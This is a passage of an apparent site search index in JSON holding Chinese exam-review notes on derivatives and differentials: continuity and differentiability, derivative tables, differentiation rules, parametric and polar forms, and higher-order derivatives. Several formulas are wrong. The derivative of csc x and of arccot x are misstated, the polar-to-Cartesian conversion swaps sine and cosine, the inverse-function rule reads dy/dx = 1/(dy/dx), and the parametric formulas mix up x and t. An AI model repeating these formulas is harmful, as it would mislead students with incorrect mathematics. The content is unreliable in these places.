\u53cd\u51fd\u6570\u7684\u5bfc\u6570 3.2.5. \u53c2\u6570\u65b9\u7a0b\u6c42\u5bfc\u6cd5 3.2.6. \u5bf9\u6570\u6c42\u5bfc\u6cd5 4. \u9ad8\u9636\u5bfc\u6570 4.1. \u9ad8\u9636\u5bfc\u6570\u7684\u5b9a\u4e49 4.2. \u5e38\u7528\u7684\u9ad8\u9636\u5bfc\u6570\u516c\u5f0f 4.3. \u6c42\u9ad8\u9636\u5bfc\u6570\u7684\u65b9\u6cd5 5. \u603b\u7ed3 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e8c\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002 2. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5 # 2.1. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5 # \u5bfc\u6570 \u6982\u5ff5\uff1a\u51fd\u6570\u5728\u67d0\u4e00\u70b9\u7684\u53d8\u5316\u7387 \u5fae\u5206 \u6982\u5ff5\uff1a\u51fd\u6570\u503c\u5728\u67d0\u4e00\u70b9\u7684\u6539\u53d8\u91cf\u7684\u8fd1\u4f3c\u503c 2.2. \u8fde\u7eed\u3001\u53ef\u5bfc\u3001\u53ef\u5fae\u4e4b\u95f4\u7684\u5173\u7cfb # \u8fde\u7eed\u4e0e\u53ef\u5bfc \u8fde\u7eed\u4e0d\u4e00\u5b9a\u53ef\u5bfc \u53ef\u5bfc\u5fc5\u5b9a\u8fde\u7eed \u8fde\u7eed\u4e0e\u53ef\u5fae \u8fde\u7eed\u4e0d\u4e00\u5b9a\u53ef\u5fae \u53ef\u5fae\u5fc5\u5b9a\u8fde\u7eed \u53ef\u5bfc\u4e0e\u53ef\u5fae(\u5728\u4e00\u5143\u51fd\u6570\u4e2d) \u53ef\u5fae\u5fc5\u5b9a\u53ef\u5bfc \u53ef\u5bfc\u5fc5\u5b9a\u53ef\u5fae \u53ef\u5bfc\u662f\u53ef\u5fae\u7684 \u5145\u5206\u5fc5\u8981 \u6761\u4ef6 \u6ce8 \uff1a\u5728\u591a\u5143\u51fd\u6570\u4e2d\uff0c\u53ef\u5bfc\uff08\u504f\u5bfc\uff09\u4e0d\u4e00\u5b9a\u53ef\u5fae\uff0c\u53ef\u5bfc\uff08\u504f\u5bfc\uff09\u4e5f\u4e0d\u4e00\u5b9a\u8fde\u7eed \u8bc1\u660e\u53ef\u5bfc\u5fc5\u53ef\u5fae \u6839\u636e\u53ef\u5bfc\u5b9a\u4e49\uff0c\u4ee4 \\lim\\limits_ {\\Delta x \\to 0}\\frac{\\Delta y}{\\Delta x} = A \u5219\u6709 \\lim\\limits_ {\\Delta x \\to 0}\\frac{\\Delta y - A\\Delta x}{\\Delta x} = 0 \u5373\u6709 \\Delta y - A\\Delta x = o(\\Delta x) \uff0c\u6545 \\Delta y = A\\Delta + o(\\Delta x) \uff0c\u5176\u4e2d A \u4e3a\u5e38\u6570\uff0c\u6ee1\u8db3\u53ef\u5fae\u7684\u5b9a\u4e49\uff0c\u56e0\u6b64\uff0c\u53ef\u5bfc\u5fc5\u53ef\u5fae\u3002 \u8bc1\u660e\u53ef\u5fae\u5fc5\u53ef\u5bfc \u6839\u636e\u53ef\u5fae\u5b9a\u4e49 \\Delta y = A\\Delta x + o(\\Delta x) \u5219 f'(x_0) = \\lim\\limits_{\\Delta x \\to 0}\\frac{A \\Delta x + o(\\Delta x)}{\\Delta x} = A \u5bfc\u6570\u5b58\u5728\uff0c\u6545\u6ee1\u8db3\u53ef\u5bfc\u7684\u5b9a\u4e49\uff0c\u56e0\u6b64\u53ef\u5fae\u5fc5\u53ef\u5bfc\uff0c\u4e14 f'(x) = A . \u5e38\u89c1\u9519\u8bef f(x) \u5728\u67d0\u90bb\u57df\u53ef\u5bfc \u4e0d\u80fd \u63a8\u51fa f'(x) \u5728 x_0 \u70b9\u8fde\u7eed \u4e0d\u80fd \u63a8\u51fa \\lim\\limits_{x \\to x_0}f'(x) \u5b58\u5728 \u9898\u578b\uff1a\u7b2c\u4e00\u7ae0\u4f8b 33 \uff0c\u8003\u5bdf\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u7684\u4f7f\u7528\u6761\u4ef6 2.3. \u5bfc\u6570\u7684\u51e0\u4f55\u610f\u4e49 # \u5bfc\u6570 f'(x_0) \u5728\u51e0\u4f55\u4e0a\u8868\u793a\u66f2\u7ebf y = f(x) \u5728\u70b9 (x_0, f(x_0)) \u5904\u5207\u7ebf\u7684\u659c\u7387\u3002 \u6ce8 \uff1a\u6cd5\u7ebf\u7684\u659c\u7387\u662f\u5207\u7ebf\u659c\u7387\u7684\u8d1f\u5012\u6570\u3002 2.4. \u76f8\u5173\u53d8\u5316\u7387 # \u5b9a\u4e49 \u8bbe x = x(t) \u53ca y = y(t) \u90fd\u662f\u53ef\u5bfc\u51fd\u6570\uff0c\u800c\u53d8\u91cf x \u4e0e y \u4e4b\u95f4\u5b58\u5728\u67d0\u79cd\u5173\u7cfb\uff0c\u4ece\u800c\u4ed6\u4eec\u7684\u53d8\u5316\u7387 \\dfrac{dx}{dt} \u4e0e \\dfrac{dy}{dt} \u4e4b\u95f4\u4e5f\u5b58\u5728\u4e00\u5b9a\u5173\u7cfb\uff0c\u8fd9\u6837\u4e24\u4e2a\u76f8\u4e92\u4f9d\u8d56\u7684\u53d8\u5316\u7387\u6210\u4e3a \u76f8\u5173\u53d8\u5316\u7387 \u4f8b\u9898\uff08\u7b2c\u4e8c\u7ae0\u4f8b 29 \uff09 \u5df2\u77e5\u52a8\u70b9 P \u5728\u66f2\u7ebf y = x^3 \u4e0a\u8fd0\u52a8\uff0c\u8bb0\u5750\u6807\u539f\u70b9\u4e0e\u70b9 P \u95f4\u7684\u8ddd\u79bb\u4e3a l \u3002\u82e5\u70b9 P \u7684\u6a2a\u5750\u6807\u5bf9\u65f6\u95f4\u7684\u53d8\u5316\u7387\u4e3a\u5e38\u6570 v_0 \uff0c\u5219\u5f53\u70b9 P \u8fd0\u52a8\u5230\u70b9 (1, 1) \u65f6\uff0c l \u5bf9\u65f6\u95f4\u7684\u53d8\u5316\u7387\u662f \\underline{\\hspace*{1cm}} . \u89e3\uff1a \u5df2\u77e5 \\dfrac{dx}{dv} = v_0 \uff0c l = \\sqrt{x^2 + x^6} \uff0c\u5219 \\frac{dl}{dt} = \\frac{dl}{dx} \\cdot \\frac{dx}{dt} = \\frac{2x + 6x^5}{2\\sqrt{x^2 + x^6}} \\cdot v_0 \u5e26\u5165\u6570\u503c x = 1 \uff0c\u5219 \\frac{dl}{dt} = \\frac{1 + 3}{\\sqrt{2}}v_0 = 2\\sqrt{2} v_0 3. \u5bfc\u6570\u516c\u5f0f\u53ca\u6c42\u5bfc\u6cd5\u5219 # 3.1. \u57fa\u672c\u521d\u7b49\u51fd\u6570\u7684\u5bfc\u6570\u516c\u5f0f # (C)' = 0 \\tag{2.1} (x^a)' = ax^{a-1} \\tag{2.2} (a^x)' = a^x\\ln(a) \\tag{2.3} (e^x)' = e^x \\tag{2.4} (\\log_a^x)' = \\frac{1}{x\\ln(a)} \\tag{2.5} (\\ln \\mid x \\mid )' = \\frac{1}{x} \\tag{2.6} (\\sin x)' = \\cos(x) \\tag{2.7} (\\cos x)' = -\\sin(x) \\tag{2.8} (\\tan x )' = \\sec^2(x) \\tag{2.9} (\\cot x)' = - \\csc^2(x) \\tag{2.10} (\\sec x)' = \\sec (x) \\tan (x) \\tag{2.11} (\\csc x)' = \\csc^2(x) \\cot (x) \\tag{2.12} (\\arcsin x)' = \\frac{1}{\\sqrt{1 - x^2}} \\tag{2.13} (\\arccos x)' = - \\frac{1}{\\sqrt{1 - x^2}} \\tag{2.14} (\\arctan x)' = \\frac{1}{1 + x^2} \\tag{2.15} (\\arcctg x)' = \\frac{1}{\\sqrt{1 - x^2}} \\tag{2.16} \u6ce8 \uff1a \\sec(x) = \\dfrac{1}{\\cos(x)} \uff0c \\csc(x) = \\dfrac{1}{\\sin(x)} 3.2. \u6c42\u5bfc\u6cd5\u5219 # 3.2.1. \u6709\u7406\u8fd0\u7b97\u6cd5\u5219 # \u8bbe u = u(x), v = v(x) \u5728 x \u5904\u53ef\u5bfc\uff0c\u5219 (u \\pm v)' = u' \\pm v' \\tag{2.17} (uv)' = u'v + uv' \\tag{2.18} (\\dfrac{u}{v})' = \\dfrac{u'v - uv'}{v^2} \\tag{2.19} 3.2.2. \u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5 # \u8bbe u = \\varphi(x) \u5728 x \u5904\u53ef\u5bfc\uff0c y = f(u) \u5728\u5bf9\u5e94\u70b9\u53ef\u5bfc\uff0c\u5219\u590d\u5408\u51fd\u6570 y = f[\\varphi(x)] \u5728 x \u5904\u53ef\u5bfc\uff0c\u5219 \\frac{dy}{dx} = \\frac{dy}{du} \\cdot \\frac{du}{dx} = f'(u)\\varphi'(x) \\tag{2.20} \u63a8\u8bba \u4e00\u4e2a\u53ef\u5bfc\u7684\u5947\uff08\u5076\uff09\u51fd\u6570\uff0c\u6c42\u4e00\u6b21\u5bfc\uff0c\u5176\u5947\u5076\u6027\u53d1\u751f\u4e00\u6b21\u53d8\u5316 \u8bc1\u660e\u63a8\u8bba \u82e5 f(x) \u4e3a \u5947\u51fd\u6570 \u3002 f(x) \u6ee1\u8db3 f(-x) = -f(x) ,\u53c8\u6839\u636e\u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5\u5219\uff0c\u5f97\u5230 f'(-x) = -f'(x) \uff0c\u5219 [f(-x)]' = -[-f(x)]' = [f(x)]' \u5373 f'(x) \u4e3a \u5076\u51fd\u6570 \u82e5 f(x) \u4e3a \u5076\u51fd\u6570 \u3002 f(x) \u6ee1\u8db3 f(-x) = f(x) ,\u53c8\u6839\u636e\u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5\u5219\uff0c\u5f97\u5230 f'(-x) = -f'(x) \uff0c\u5219 [f(-x)]' = -[f(x)]' \u5373 f'(x) \u4e3a \u5947\u51fd\u6570 3.2.3. \u9690\u51fd\u6570\u6c42\u5bfc\u6cd5 # \u8bbe y = y(x) \u662f\u7531\u65b9\u7a0b F(x, y) = x \u6240\u786e\u5b9a\u7684\u53ef\u5bfc\u51fd\u6570\uff0c\u4e3a\u6c42\u5f97 y' \uff0c\u53ef\u5728\u65b9\u7a0b F(x, y) = 0 \u4e24\u8fb9\u5bf9 x \u6c42\u5bfc\uff0c\u53ef\u5f97\u5230\u4e00\u4e2a\u542b\u6709 y' \u7684\u65b9\u7a0b\uff0c\u4ece\u4e2d\u89e3\u51fa y' \u5373\u53ef\u3002 \u6ce8 \uff1a y' \u4e5f\u53ef\u7531\u591a\u5143\u51fd\u6570\u5fae\u5206\u6cd5\u4e2d\u7684\u9690\u51fd\u6570\u6c42\u5bfc\u516c\u5f0f2.21\u5f97\u5230\u3002 \\frac{dy}{dx} = - \\frac{F'_x}{F'_y} \\tag{2.21} 3.2.4. \u53cd\u51fd\u6570\u7684\u5bfc\u6570 # \u82e5 y = f(x) \u5728\u67d0\u533a\u95f4\u5185\u53ef\u5bfc\uff0c\u4e14 f'(x) \\ne 0 \uff0c\u5219\u5176\u53cd\u51fd\u6570 x = \\varphi (x) \u5728\u5bf9\u5e94\u533a\u95f4\u5185\u4e5f\u53ef\u5bfc\uff0c\u4e14 \\varphi (y) = \\frac{1}{f'(x)} \\tag{2.22} \u5373 \\frac{dy}{dx} =\\frac{1}{\\dfrac{dy}{dx}} 3.2.5. \u53c2\u6570\u65b9\u7a0b\u6c42\u5bfc\u6cd5 # \u8bbe y = y(x) \u662f\u7531\u53c2\u6570\u65b9\u7a0b {\\left\\{ \\begin{aligned} &x = \\varphi (x)\\\\ &y = \\psi (x)\\\\ \\end{aligned}\\right. }, (\\alpha < t < \\beta) \u786e\u5b9a\u7684\u51fd\u6570\uff0c\u5219 \u82e5 \\varphi (x) \u548c \\psi (x) \u90fd\u53ef\u5bfc\uff0c\u4e14 \\varphi(t) \\ne 0 \uff0c\u5219 \\frac{dy}{dx} = \\frac{\\psi(x)}{\\varphi(x)} \\tag{2.23} \u82e5 \\varphi (x) \u548c \\psi (x) \u90fd\u4e8c\u9636\u53ef\u5bfc\uff0c\u4e14 \\varphi(t) \\ne 0 \uff0c\u5219 \\frac{d^2 y}{d^2 x} = \\frac{d}{dt}(\\frac{dy}{dx}) \\cdot \\frac{dt}{dx}= \\frac{d}{dt}(\\frac{\\psi '(t)}{\\varphi '(t)}) \\cdot \\frac{1}{\\varphi '(x)} = \\frac{\\psi ''(t)\\varphi '(x) - \\varphi ''(x) \\psi '(t)}{\\varphi^3 (t)} \\tag{2.24} 3.2.5.1. \u6781\u5750\u6807\u65b9\u7a0b\u8f6c\u5316\u4e3a\u53c2\u6570\u65b9\u7a0b\u5f62\u5f0f \u6781\u5750\u6807\u6027\u8d28 {\\left\\{ \\begin{aligned} \\rho^2 &= x^2 + y^2\\\\ \\tan \\theta &= \\frac{y}{x} (x \\ne 0)\\\\ \\end{aligned}\\right.} \\tag{2.25} \u6781\u5750\u6807\u8f6c\u5316\u4e3a\u76f4\u89d2\u5750\u6807\u7684\u8f6c\u5316\u516c\u5f0f {\\left\\{ \\begin{aligned} x = \\rho \\sin \\theta\\\\ y = \\rho \\cos \\theta\\\\ \\end{aligned}\\right.} \\tag{2.26} \u5df2\u77e5\u7ecf\u8fc7\u70b9 M(\\rho_o, \\theta_0) \uff0c\u4e14\u76f4\u7ebf\u4e0e\u6781\u8f74\u6240\u6210\u89d2\u4e3a \\alpha \u7684\u76f4\u7ebf l \uff0c\u5176\u6781\u5750\u6807\u65b9\u7a0b\u4e3a \\rho \\sin (\\alpha - \\theta) = \\rho_0 \\sin(\\alpha_0 - \\theta_0) \u5373 \\rho = \\rho_0 \\sec(\\alpha_0 - \\theta_0) \u8f6c\u5316\u4e3a\u53c2\u6570\u65b9\u7a0b\u5f62\u5f0f {\\left\\{ \\begin{aligned} x = \\rho_0 \\sec(\\alpha_0 - \\theta_0) \\sin(\\theta)\\\\ y = \\rho_0 \\sec(\\alpha_0 - \\theta_0) \\cos(\\theta)\\\\ \\end{aligned} \\right.} 3.2.6. \u5bf9\u6570\u6c42\u5bfc\u6cd5 # \u5982\u679c y = y(x) \u7684\u8868\u8fbe\u5f0f\u7531 \u591a\u4e2a\u56e0\u5f0f\u7684\u4e58\u9664\u3001\u4e58\u5e42 \u6784\u6210\uff0c\u6216\u662f \u5e42\u6307\u51fd\u6570 \u7684\u5f62\u5f0f\uff0c\u5219\u53ef\u5148\u5c06\u51fd\u6570\u53bb\u5bf9\u6570\uff0c\u7136\u540e\u4e24\u8fb9\u5bf9 x \u6c42\u5bfc\u3002 \u6ce8 \uff1a\u5bf9\u7b49\u5f0f\u4e24\u8fb9\u53d6\u5bf9\u6570\uff0c\u9700\u8981\u6ee1\u8db3\u7b49\u5f0f\u4e24\u8fb9\u90fd\u5927\u4e8e0\u7684\u6761\u4ef6 4. \u9ad8\u9636\u5bfc\u6570 # 4.1. \u9ad8\u9636\u5bfc\u6570\u7684\u5b9a\u4e49 # \u542b\u4e49\uff1a\u4e00\u822c\u5730\uff0c\u51fd\u6570 y = f(x) \u7684 n \u9636\u5bfc\u6570\u4e3a y^{(n)} = [f^{(n - 1)}(x)]' \uff0c\u4e5f\u53ef\u8bb0\u4e3a f^{(n)}(x) \u6216 \\dfrac{d^ny}{dx^n} \uff0c\u5373 n \u9636\u5bfc\u6570\u5c31\u662f n-1 \u9636\u5bfc\u51fd\u6570\u7684\u5bfc\u6570\u3002 \u6ce8 \uff1a\u5982\u679c\u51fd\u6570\u5728\u70b9 x \u5904 n \u9636\u53ef\u5bfc\uff0c\u5219\u5728\u70b9 x \u7684\u67d0\u90bb\u57df\u5185 f(x) \u5fc5\u5b9a\u5177\u6709\u4e00\u5207\u4f4e\u4e8e n \u9636\u7684\u5bfc\u6570\u3002 4.2. \u5e38\u7528\u7684\u9ad8\u9636\u5bfc\u6570\u516c\u5f0f # (\\sin x)^{(n)} = \\sin (x + n \\cdot \\frac{\\pi}{2}) \\tag{2.27} (cos x)^{(n)} = \\cos (x + n \\cdot \\frac{\\pi}{2}) \\tag{2.28} (u \\pm v)^{(n)} = u^{(n)} \\pm v^{(n)} \\tag{2.29} (uv)^{(n)} = \\sum_{k=0}^n C_n^k u^{(k)}v^{(n-k)} \\tag{2.30} \u5f0f2.24\u53ef\u7c7b\u6bd4 n \u9636\u4e8c\u9879\u5f0f\u516c\u5f0f (u + v)^{n} = \\sum_{k=0}^n C_n^k u^{k}v^{n-k} \\tag{2.31} \u63a8\u8bba \u82e5 y= \\sin(ax + b) \uff0c\u5219 y^{(n)} = a^n \\sin(ax + b + n \\cdot \\frac{\\pi}{2}) \\tag{2.32} \u8bc1\u660e \u901a\u8fc7\u5f52\u7eb3\u6cd5\uff0c\u6c42 y' \u548c y'' \uff0c\u63a8\u51fa y^{(n)} . 4.3. \u6c42\u9ad8\u9636\u5bfc\u6570\u7684\u65b9\u6cd5 # \u516c\u5f0f\u6cd5\uff0c\u5e26\u5165\u9ad8\u9636\u5bfc\u6570\u516c\u5f0f \u5f52\u7eb3\u6cd5\uff0c\u6c42 y' \uff0c y'' \uff0c\u5f52\u7eb3 y^{(n)} 5. \u603b\u7ed3 # \u5bfc\u6570 \u5b9a\u4e49 \u6c42\u5bfc\u6cd5\u5219 \u9ad8\u9636\u5bfc\u6570 \u5fae\u5206 \u5b9a\u4e49 \u5fae\u5206\u4e0e\u53ef\u5bfc\u7684\u5173\u7cfb \u5fae\u5206\u65b9\u7a0b\u6c42\u5bfc","title":"2.\u7b2c\u4e8c\u7ae0 \u5bfc\u6570\u4e0e\u5fae\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#_1","text":"","title":"\u7b2c\u4e8c\u7ae0 \u5bfc\u6570\u4e0e\u5fae\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#_2","text":"\u7b2c\u4e8c\u7ae0 \u5bfc\u6570\u4e0e\u5fae\u5206 \u76ee\u5f55 1. \u80cc\u666f 2. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5 2.1. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5 2.2. \u8fde\u7eed\u3001\u53ef\u5bfc\u3001\u53ef\u5fae\u4e4b\u95f4\u7684\u5173\u7cfb 2.3. \u5bfc\u6570\u7684\u51e0\u4f55\u610f\u4e49 2.4. \u76f8\u5173\u53d8\u5316\u7387 3. \u5bfc\u6570\u516c\u5f0f\u53ca\u6c42\u5bfc\u6cd5\u5219 3.1. \u57fa\u672c\u521d\u7b49\u51fd\u6570\u7684\u5bfc\u6570\u516c\u5f0f 3.2. \u6c42\u5bfc\u6cd5\u5219 3.2.1. \u6709\u7406\u8fd0\u7b97\u6cd5\u5219 3.2.2. \u590d\u5408\u51fd\u6570\u6c42\u5bfc\u6cd5 3.2.3. \u9690\u51fd\u6570\u6c42\u5bfc\u6cd5 3.2.4. \u53cd\u51fd\u6570\u7684\u5bfc\u6570 3.2.5. \u53c2\u6570\u65b9\u7a0b\u6c42\u5bfc\u6cd5 3.2.6. \u5bf9\u6570\u6c42\u5bfc\u6cd5 4. \u9ad8\u9636\u5bfc\u6570 4.1. \u9ad8\u9636\u5bfc\u6570\u7684\u5b9a\u4e49 4.2. \u5e38\u7528\u7684\u9ad8\u9636\u5bfc\u6570\u516c\u5f0f 4.3. \u6c42\u9ad8\u9636\u5bfc\u6570\u7684\u65b9\u6cd5 5. \u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#1","text":"\u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e8c\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#2","text":"","title":"2. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#21","text":"\u5bfc\u6570 \u6982\u5ff5\uff1a\u51fd\u6570\u5728\u67d0\u4e00\u70b9\u7684\u53d8\u5316\u7387 \u5fae\u5206 \u6982\u5ff5\uff1a\u51fd\u6570\u503c\u5728\u67d0\u4e00\u70b9\u7684\u6539\u53d8\u91cf\u7684\u8fd1\u4f3c\u503c","title":"2.1. \u5bfc\u6570\u4e0e\u5fae\u5206\u7684\u6982\u5ff5"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#22","text":"\u8fde\u7eed\u4e0e\u53ef\u5bfc \u8fde\u7eed\u4e0d\u4e00\u5b9a\u53ef\u5bfc \u53ef\u5bfc\u5fc5\u5b9a\u8fde\u7eed \u8fde\u7eed\u4e0e\u53ef\u5fae \u8fde\u7eed\u4e0d\u4e00\u5b9a\u53ef\u5fae \u53ef\u5fae\u5fc5\u5b9a\u8fde\u7eed \u53ef\u5bfc\u4e0e\u53ef\u5fae(\u5728\u4e00\u5143\u51fd\u6570\u4e2d) \u53ef\u5fae\u5fc5\u5b9a\u53ef\u5bfc \u53ef\u5bfc\u5fc5\u5b9a\u53ef\u5fae \u53ef\u5bfc\u662f\u53ef\u5fae\u7684 \u5145\u5206\u5fc5\u8981 \u6761\u4ef6 \u6ce8 \uff1a\u5728\u591a\u5143\u51fd\u6570\u4e2d\uff0c\u53ef\u5bfc\uff08\u504f\u5bfc\uff09\u4e0d\u4e00\u5b9a\u53ef\u5fae\uff0c\u53ef\u5bfc\uff08\u504f\u5bfc\uff09\u4e5f\u4e0d\u4e00\u5b9a\u8fde\u7eed \u8bc1\u660e\u53ef\u5bfc\u5fc5\u53ef\u5fae \u6839\u636e\u53ef\u5bfc\u5b9a\u4e49\uff0c\u4ee4 \\lim\\limits_ {\\Delta x \\to 0}\\frac{\\Delta y}{\\Delta x} = A \u5219\u6709 \\lim\\limits_ {\\Delta x \\to 0}\\frac{\\Delta y - A\\Delta x}{\\Delta x} = 0 \u5373\u6709 \\Delta y - A\\Delta x = o(\\Delta x) \uff0c\u6545 \\Delta y = A\\Delta + o(\\Delta x) \uff0c\u5176\u4e2d A \u4e3a\u5e38\u6570\uff0c\u6ee1\u8db3\u53ef\u5fae\u7684\u5b9a\u4e49\uff0c\u56e0\u6b64\uff0c\u53ef\u5bfc\u5fc5\u53ef\u5fae\u3002 \u8bc1\u660e\u53ef\u5fae\u5fc5\u53ef\u5bfc \u6839\u636e\u53ef\u5fae\u5b9a\u4e49 \\Delta y = A\\Delta x + o(\\Delta x) \u5219 f'(x_0) = \\lim\\limits_{\\Delta x \\to 0}\\frac{A \\Delta x + o(\\Delta x)}{\\Delta x} = A \u5bfc\u6570\u5b58\u5728\uff0c\u6545\u6ee1\u8db3\u53ef\u5bfc\u7684\u5b9a\u4e49\uff0c\u56e0\u6b64\u53ef\u5fae\u5fc5\u53ef\u5bfc\uff0c\u4e14 f'(x) = A . \u5e38\u89c1\u9519\u8bef f(x) \u5728\u67d0\u90bb\u57df\u53ef\u5bfc \u4e0d\u80fd \u63a8\u51fa f'(x) \u5728 x_0 \u70b9\u8fde\u7eed \u4e0d\u80fd \u63a8\u51fa \\lim\\limits_{x \\to x_0}f'(x) \u5b58\u5728 \u9898\u578b\uff1a\u7b2c\u4e00\u7ae0\u4f8b 33 \uff0c\u8003\u5bdf\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u7684\u4f7f\u7528\u6761\u4ef6","title":"2.2. \u8fde\u7eed\u3001\u53ef\u5bfc\u3001\u53ef\u5fae\u4e4b\u95f4\u7684\u5173\u7cfb"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#23","text":"\u5bfc\u6570 f'(x_0) \u5728\u51e0\u4f55\u4e0a\u8868\u793a\u66f2\u7ebf y = f(x) \u5728\u70b9 (x_0, f(x_0)) \u5904\u5207\u7ebf\u7684\u659c\u7387\u3002 \u6ce8 \uff1a\u6cd5\u7ebf\u7684\u659c\u7387\u662f\u5207\u7ebf\u659c\u7387\u7684\u8d1f\u5012\u6570\u3002","title":"2.3. \u5bfc\u6570\u7684\u51e0\u4f55\u610f\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/2.%E7%AC%AC%E4%BA%8C%E7%AB%A0_%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/#24","text":"\u5b9a\u4e49 \u8bbe x = x(t) \u53ca y = y(t) \u90fd\u662f\u53ef\u5bfc\u51fd\u6570\uff0c\u800c\u53d8\u91cf x \u4e0e y \u4e4b\u95f4\u5b58\u5728\u67d0\u79cd\u5173\u7cfb\uff0c\u4ece\u800c\u4ed6\u4eec\u7684\u53d8\u5316\u7387 \\dfrac{dx}{dt} \u4e0e \\dfrac{dy}{dt} \u4e4b\u95f4\u4e5f\u5b58\u5728\u4e00\u5b9a\u5173\u7cfb\uff0c\u8fd9\u6837\u4e24\u4e2a\u76f8\u4e92\u4f9d\u8d56\u7684\u53d8\u5316\u7387\u6210\u4e3a \u76f8\u5173\u53d8\u5316\u7387 \u4f8b\u9898\uff08\u7b2c\u4e8c\u7ae0\u4f8b 29 \uff09 \u5df2\u77e5\u52a8\u70b9 P \u5728\u66f2\u7ebf y = x^3 \u4e0a\u8fd0\u52a8\uff0c\u8bb0\u5750\u6807\u539f\u70b9\u4e0e\u70b9 P \u95f4\u7684\u8ddd\u79bb\u4e3a l \u3002\u82e5\u70b9 P \u7684\u6a2a\u5750\u6807\u5bf9\u65f6\u95f4\u7684\u53d8\u5316\u7387\u4e3a\u5e38\u6570 v_0 \uff0c\u5219\u5f53\u70b9 P \u8fd0\u52a8\u5230\u70b9 (1, 1) \u65f6\uff0c l \u5bf9\u65f6\u95f4\u7684\u53d8\u5316\u7387\u662f \\underline{\\hspace*{1cm}} . \u89e3\uff1a \u5df2\u77e5 \\dfrac{dx}{dv} = v_0 \uff0c l = \\sqrt{x^2 + x^6} \uff0c\u5219 \\frac{dl}{dt} = \\frac{dl}{dx} \\cdot \\frac{dx}{dt} = \\frac{2x + 6x^5}{2\\sqrt{x^2 + x^6}} \\cdot v_0 \u5e26\u5165\u6570\u503c x = 1 \uff0c\u5219 \\frac{dl}{dt} = \\frac{1 + 3}{\\sqrt{2}}v_0 = 2\\sqrt{2} v_0","title":"2.4. 